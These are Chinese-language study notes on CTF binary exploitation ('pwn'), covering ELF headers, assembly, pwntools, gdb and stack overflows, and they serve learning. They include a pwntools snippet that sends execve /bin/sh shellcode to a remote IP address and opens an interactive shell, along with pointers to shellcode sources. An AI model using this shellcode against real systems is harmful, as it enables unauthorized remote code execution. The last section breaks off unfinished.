# pwn 

## 基础知识

### 可执行文件的创建过程

```flow
st=>start: c代码
o1=>operation: 预处理
o2=>operation: 编译
o3=>operation: 汇编
o3=>operation: 连接
y=>operation: 预处理文件
h=>operation: asm代码(汇编代码)
o=>operation: 二进制文件
e=>end: 可执行文件

st(right)->o1->y(right)->o2->h(right)->o3->o(right)->e

```

### 内存模型stack 和 heap和帧

### ELF文件头

- TYPE 确定文件类型(可重定位文件(.o),可执行文件(.exe/...),共享目标文件(.so))
- CLASS:确定文件是32位还是64位

#### 查看方法

```shell
readelf -h target # 查看ELF的头信息
readelf -l target # 查看elf头详细信息


```

### 不同寄存器的意义

一般修改返回地址是修改esp

`EAX`通常被用作存放函数的返回值

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5mx2qrfc1j30jy0dstbn.jpg)

### 简单的汇编命令

- push 
- call
- mov
- add
- pop
- ret

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5muped2obj30j705z42r.jpg)



```assembly
cmp [ebx+10], 1 // 判断 [ebx+10] 是否为 1
je no_decrese_health // 如果相等的话，则跳转到 no_decrese_health 标签
```



http://www.ruanyifeng.com/blog/2018/01/assembly-language-primer.html

[https://wooyun.js.org/drops/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89.html](https://wooyun.js.org/drops/逆向基础（一）.html)

#### Intel与AT&T的重要区别

在Intel与AT&T语法当中比较重要的区别就是：

操作数写在后面

```
在Intel语法中：<instruction> <destination operand> <source operand>
在AT&T语法中：<instruction> <source operand> <destination operand>
```

有一个理解它们的方法: 当你面对intel语法的时候，你可以想象把等号放到2个操作数中间，当面对AT&T语法的时候，你可以放一个右箭头(→）到两个操作数之间。

AT&T: 在寄存器名之前需要写一个百分号(%)并且在数字前面需要美元符($)。方括号被圆括号替代。 AT&T: 一些用来表示数据形式的特殊的符号

```
l      long(32 bits)
w      word(16bits)
b      byte(8 bits)
```



## shellcode

shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。

### 网站

http://shell-storm.org/shellcode/

### 注意事项

系统,汇编语言一定要选对

方法:readelf -h file 

看class,os,machine

## pwntools 使用

### 注意

***send()是发送数据,sendline()发送一行数据***



### 连接

```python
from pwn import *
conn = remote('ftp.debian.org',21) #连接
conn.recvline() # 接收一行消息
conn.send('hello') #发送消息
conn.interactive()# 进入交互模式
conn.close()#关闭连接

```

### 和进程进程交互

```python
sh = process('/bin/sh')
sh.sendline('sleep 3; echo hello world;')
sh.recvline(timeout=1)
sh.close()
```

### ssh连接

```python
shell = ssh('username', 'bandit.labs.overthewire.org', password='passwd')
shell['whoami']
shell.download_file('/etc/motd')
sh = shell.run('sh')
sh.sendline('sleep 3; echo hello world;') 
sh.recvline(timeout=1)
shell.close()
```

### 设置目标系统架构及操作系统

`context(arch='arm', os='linux', endian='big', word_size=32)`

### 汇编和反汇编

```python
asm('mov eax, 0').encode('hex')
disasm('6a0258cd80ebf9'.decode('hex'))

```

### 在触发的崩溃中寻找偏移量或缓冲区大小

```python
print cyclic(20)
aaaabaaacaaadaaaeaaa
# Assume EIP = 0x62616166 ('faab' which is pack(0x62616166))  at crash time
 print cyclic_find('faab')
120
```

### Shellcode生成器

使用shellcraft可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到

```python
print shellcraft.i386.nop().strip('\n')   print shellcraft.i386.linux.sh()
```

### 简单实例

```python
#
from pwn import *
conn=remote('120.79.114.39',10001)
shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
#from http://shell-storm.org/shellcode/files/shellcode-517.php
conn.send(shellcode)
conn.interactive()
```



## gdb 的使用

启动gdb后，进入到交互模式，通过以下命令完成对程序的调试；注意高频使用的命令一般都会有缩写，熟练使用这些缩写命令能提高调试的效率；

### 运行

- run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。
- continue （简写c ）：继续执行，到下一个断点处（或运行结束）
- next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。
- step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的
- until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。
- until+行号： 运行至某行，不仅仅用来跳出循环
- finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。
- call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55)
- quit：简记为 q ，退出gdb

### 设置断点

- break n （简写b n）:在第n行处设置断点

  b 1在代码第一行设置断点

- b fn1 if a＞b：条件断点设置

- break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button

- delete 断点号n：删除第n个断点

- disable 断点号n：暂停第n个断点

- enable 断点号n：开启第n个断点

- clear 行号n：清除第n行的断点

- info b （info breakpoints） ：显示当前程序的断点设置情况

- delete breakpoints：清除所有断点：

### 查看源代码

- list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。
- list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12
- list 函数名：将显示“函数名”所在函数的源代码，如：list main
- list ：不带参数，将接着上一次 list 命令的，输出下边的内容。

### 打印表达式

- print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。
- print a：将显示整数 a 的值
- print ++a：将把 a 中的值加1,并显示出来
- print name：将显示字符串 name 的值
- print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数
- print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数
- display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a
- watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a
- whatis ：查询变量或函数
- info function： 查询函数
- 扩展info locals： 显示当前堆栈页的所有变量

### 查询运行信息

- where/bt ：当前运行的堆栈列表；
- bt backtrace 显示当前调用堆栈
- up/down 改变堆栈显示的深度
- set args 参数:指定运行时的参数
- show args：查看设置好的参数
- info program： 来查看程序的是否在运行，进程号，被暂停的原因。

### 分割窗口

- layout：用于分割窗口，可以一边查看代码，一边测试：
- layout src：显示源代码窗口
- layout asm：显示反汇编窗口
- layout regs：显示源代码/反汇编和CPU寄存器窗口
- layout split：显示源代码和反汇编窗口
- Ctrl + L：刷新窗口

## CTF中pwn题的搭建

http://www.jianshu.com/p/a659924515f7

## 栈溢出

### 原理

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是

- 程序必须向栈上写入数据。
- 写入的数据大小没有被良好地控制。

### 利用方式

1. 覆盖返回地址为shellcode地址

2. 

   